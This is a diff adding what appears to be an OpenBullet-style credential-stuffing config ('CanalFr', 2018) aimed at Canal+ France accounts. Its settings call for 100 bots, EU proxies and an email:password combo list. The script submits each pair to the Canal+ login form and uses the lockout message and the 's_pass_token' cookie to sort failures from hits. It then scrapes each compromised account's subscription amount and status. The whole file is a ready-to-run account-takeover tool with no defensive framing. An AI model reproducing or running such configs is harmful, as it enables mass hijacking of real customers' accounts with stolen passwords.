@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "CanalFr",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-28T12:35:07.6284452+00:00",
+  "AdditionalInfo": "MUST USE EU PROXIES, dont use rotating proxies. such as strorm or rack.",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://pass.canal-plus.com/form/authentication_sms_activation?bundle=site&ssoconf=auth_mini_actsms_myc&popin=true&pass_target=https%3A%2F%2Fclient.canal.fr%2Fabonnement%2F%3Forigref%3D&urlSource=https%3A%2F%2Fclient.canal.fr%2Fabonnement%2F%3Forigref%3D&pass_modal=false&socialLinksDisabled=true&omnitureChannel=Vente&distributorId=" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+REQUEST POST "https://pass.canal-plus.com/form/authentication_sms_activation?bundle=site&ssoconf=auth_mini_actsms_myc&popin=true&pass_target=https%3A%2F%2Fclient.canal.fr%2Fabonnement%2F%3Forigref%3D&urlSource=https%3A%2F%2Fclient.canal.fr%2Fabonnement%2F%3Forigref%3D&pass_modal=false&socialLinksDisabled=true&omnitureChannel=Vente&distributorId=" AutoRedirect=TRUE 
+  CONTENT "error=&submit=submit&socialAction=authentication&ssoEmail=<USER>&ssoPass=<PASS>&__checkbox_ssoMem=true&submitButton=Valider" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "referer: https://pass.canal-plus.com/form/authentication_sms_activation?bundle=site&ssoconf=auth_mini_actsms_myc&popin=true&pass_target=https%3A%2F%2Fclient.canal.fr%2Fabonnement%2F%3Forigref%3D&urlSource=https%3A%2F%2Fclient.canal.fr%2Fabonnement%2F%3Forigref%3D&pass_modal=false&socialLinksDisabled=true&omnitureChannel=Vente&distributorId=" 
+  HEADER "origin: https://pass.canal-plus.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Pour prévenir les tentatives de fraude, le compte CANAL se bloque après plusieurs tentatives erronées. Le compte est alors bloqué pour 24 heures." 
+  KEYCHAIN Success OR 
+    KEY "s_pass_token" 
+REQUEST GET "https://secure.espaceclientcanal.canal-plus.com/secure/3/abonne/mon-compte/abonnement/modif-abo/pid253-consulter-mon-abonnement.html" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "class=\"montantTotal\">" "&euro;" Recursive=FALSE -> CAP "montantTotal" "" "€" 
+PARSE "<SOURCE>" LR "s.eVar14=\"abonne\";" "s.pageName" Recursive=FALSE -> CAP "DATA" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "backConnectIssues" 
